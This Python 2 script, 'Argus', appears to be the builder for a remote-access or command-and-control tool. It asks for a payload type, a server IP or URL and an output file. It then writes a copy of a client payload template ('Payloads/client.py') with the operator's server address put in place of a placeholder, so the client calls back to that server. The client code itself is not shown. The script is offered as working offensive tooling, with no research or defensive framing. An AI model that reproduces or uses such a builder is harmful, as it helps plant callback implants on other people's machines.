import sys, platform, subprocess

class Constants():
    language = 0
    path = 1
    extension = 2

def print_logo ():
    print """
      
     ▄▄▄       ██▀███    ▄████  █    ██   ██████ 
    ▒████▄    ▓██ ▒ ██▒ ██▒ ▀█▒ ██  ▓██▒▒██    ▒ 
    ▒██  ▀█▄  ▓██ ░▄█ ▒▒██░▄▄▄░▓██  ▒██░░ ▓██▄   
    ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█  ██▓▓▓█  ░██░  ▒   ██▒
     ▓█   ▓██▒░██▓ ▒██▒░▒▓███▀▒▒▒█████▓ ▒██████▒▒
     ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ░▒   ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
      ▒   ▒▒ ░  ░▒ ░ ▒░  ░   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░
      ░   ▒     ░░   ░ ░ ░   ░  ░░░ ░ ░ ░  ░  ░  
          ░  ░   ░           ░    ░           ░  
                                             


                     WELCOME TO ARGUS
                
    """

def list_payloads (payloads):
    for index, payload in enumerate(payloads):
        print "\t[%d] %s\n" % (index, payload[Constants.language])

def get_payload_value (message, n_payloads):
    while 1:
        try:
            payload = input (message)
            if payload < n_payloads:
                break
            else:
                print '[!] Invalid index.'
        except KeyboardInterrupt:
            print '\n[-] Argus stopped.\n'
            sys.exit(0)
        except:
            print '[!] Invalid input.'

    return payload

def get_non_empty_string (message, error):
    while 1:
        try:
            s = raw_input (message)

            if not s:
                print error
            else:
                break
        except KeyboardInterrupt:
            print '\n[-] Argus stopped.\n'
            sys.exit(0)

    return s

# PAYLOAD LIST
payloads = [ ['Python', 'Payloads/client.py', '.py'] ]

# Importing third-party dependencies
try:
    #import PyInstaller
    import requests, grequests
except:
    try:
        print_logo ()
        import pip

        while 1:
            install = get_non_empty_string('[*] Some dependencies are missing, do you want to install them? (y/n): ', '[!] Invalid input')

            if install == 'y':
                pip.main(['install', 'requests'])
                pip.main(['install', 'grequests'])
                #pip.main(['install', 'PyInstaller'])
                break

                print '[+] Dependencies installed correctly'
            elif install == 'n':
                sys.exit(0)

    except:
        print '[!] Missing dependencies.'
        sys.exit(0)

print_logo ()

# Selecting payload to generate
list_payloads (payloads)
payload = get_payload_value ("Payload >> ", len(payloads))
print "[+] %s payload selected.\n" % (payloads[payload][Constants.language])

# Setting the server ip
server = get_non_empty_string ("Server IP/URL >> ", "[!] URL cannot be empty.")
if not server.startswith('http://') and not server.startswith('https://'):
    server = 'http://' + server
print "[+] %s set as server.\n" % (server)

# Setting the output file
output_file = get_non_empty_string ("Output file >> ", "[!] Invalid filename")
if not output_file.endswith (payloads[payload][Constants.extension]):
    output_file += payloads[payload][Constants.extension]
print "[+] Output file: %s\n" % (output_file)

# Writing the payload
with open (payloads[payload][Constants.path], 'r') as fp:
    with open (output_file, 'w') as out:
        for line in fp:
            if 'REPLACE_ME' in line:
                line = line.replace ('REPLACE_ME', server)

            out.write (line)

print "[*] %s written successfully.\n" % (output_file)
